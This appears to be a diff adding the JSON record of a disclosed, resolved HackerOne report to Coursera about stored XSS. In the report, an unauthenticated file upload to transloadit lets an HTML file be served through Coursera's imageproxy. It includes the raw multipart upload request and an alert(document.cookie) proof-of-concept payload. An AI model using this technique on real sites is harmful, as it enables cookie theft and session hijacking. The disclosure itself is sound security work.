@@ -1,0 +1,125 @@
+{
+  "id": 216822,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTY4MjI=",
+  "url": "https://hackerone.com/reports/216822",
+  "title": "Stored XSS via transloadit.com and imageproxy",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-28T22:32:00.312Z",
+  "submitted_at": "2017-03-28T22:32:00.312Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "c0rdis",
+    "url": "/c0rdis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/006/695/8bc5ec2323f00e8097cf96e37a4424139e4b1ff0_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1516,
+    "url": "https://hackerone.com/coursera",
+    "handle": "coursera",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bzweea5s15ui3jhf2h39j60wsxkb/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/bzweea5s15ui3jhf2h39j60wsxkb/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Coursera",
+      "twitter_handle": "coursera",
+      "website": "https://www.coursera.org",
+      "about": "We provide universal access to the world’s best education."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-30T21:38:45.594Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-31T21:38:44.588Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\ndue to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser. \n\nSteps to reproduce:\n\n1) Let's send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.\nPOST /assemblies/[hash]?redirect=false HTTP/1.1\nHost: isadora.transloadit.com\nReferer: https://api.coursera.org/account/profile\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880\nContent-Length: 521\n\n-----------------------------185739484714145007371896001845\nContent-Disposition: form-data; name=\"params\"\n\n{\"max_size\":1048576,\"auth\":{\"key\":\"[hash2]\"},\"template_id\":\"[hash3]\"}\n-----------------------------185739484714145007371896001845\nContent-Disposition: form-data; name=\"my_file\"; filename=\"stored_xss.html\"\nContent-Type: text/html\n\n<html>\n<script>\nalert(document.cookie);\n</script>\n</html>\n-----------------------------185739484714145007371896001845--\n\n2) By accessing https://isadora.transloadit.com/assemblies/[hash]?seq=0&callback=, we can learn the URL of the uploaded malicious file (in this case it's http://coursera-profile-photos.s3.amazonaws.com██████████stored_xss.html)\n\n3) Since it's already trusted, we could use it to upload as the profile photo, or to fetch via imageproxy as mentioned above. Final URL: https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com█████stored_xss.html\n\nPlease find the screenshot attached.\nAA",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-11-30T21:38:44.679Z",
+  "allow_singular_disclosure_after": -266262385.87974346,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "r3y",
+    "eveeez",
+    "cr4xerbik4sh",
+    "rajauzairabdullah",
+    "r3t0x"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
